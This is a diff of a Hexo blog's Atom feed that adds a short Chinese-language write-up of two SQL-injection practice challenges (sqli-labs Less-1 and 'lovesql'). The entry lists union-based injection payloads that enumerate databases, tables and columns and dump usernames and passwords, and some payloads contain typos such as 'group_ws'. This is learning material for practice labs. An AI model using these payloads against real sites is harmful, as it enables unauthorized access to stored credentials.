@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-11-14T14:00:42.281Z</updated>
+  <updated>2021-11-17T07:38:34.643Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,24 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less1,lovesql</title>
+    <link href="http://example.com/2021/11/17/less1-lovesql/"/>
+    <id>http://example.com/2021/11/17/less1-lovesql/</id>
+    <published>2021-11-17T07:29:24.000Z</published>
+    <updated>2021-11-17T07:38:34.643Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1."></a>less1.</h2><p>判断是否存在注入?id=1，存在回显，加上‘后回显错误，判断其是单引号字符型注入</p><p>后用order by语句判断有几列数据</p><span id="more"></span> <p>UNION SELECT联合查询，在这改成id=-1，-1是数据库中不存在的，所以用union select查询后是否用回显位</p><p>在这道题</p><p>查库union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p>查表union select 1,2,group_concat(table_name) from information_schema.tables where table schema=0xsecurity–+</p><p>查字段union select column_name from information_schema.columns where tables_name=0xusers</p><p>查数据union select 1,2,group_concat(group_ws(‘~’,username,password)) from security.users–+<br>在这里使用hackbar转换表名为16进制，可以避免‘’的错误</p><p>函数 </p><p>1.group_concat直接查询所有的数据</p><p>2.group_ws(‘<del>‘)将要查询的两个数据用</del>连接，与group_concat联合使用查询全部</p><h2 id="lovesql"><a href="#lovesql" class="headerlink" title="lovesql."></a>lovesql.</h2><p>与less1的做法大概相同。<br>判断需要#，order by，union<br>查库 select 1,database(),3# 得到username为geek<br>查表 select 1,2,group_concat(table_name) from infromation_schema.tables where table schema=database()#得到数据后<br>查字段 select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’#<br>查数据 select 1,2,group_concat(id,username,password) from l0ve1ysq1#</p><p>而在这题好像只能在给出的两个输入框中输入，无法转换成16进制</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;less1&quot;&gt;&lt;a href=&quot;#less1&quot; class=&quot;headerlink&quot; title=&quot;less1.&quot;&gt;&lt;/a&gt;less1.&lt;/h2&gt;&lt;p&gt;判断是否存在注入?id=1，存在回显，加上‘后回显错误，判断其是单引号字符型注入&lt;/p&gt;
+&lt;p&gt;后用order by语句判断有几列数据&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>关于sql靶场的搭建问题</title>
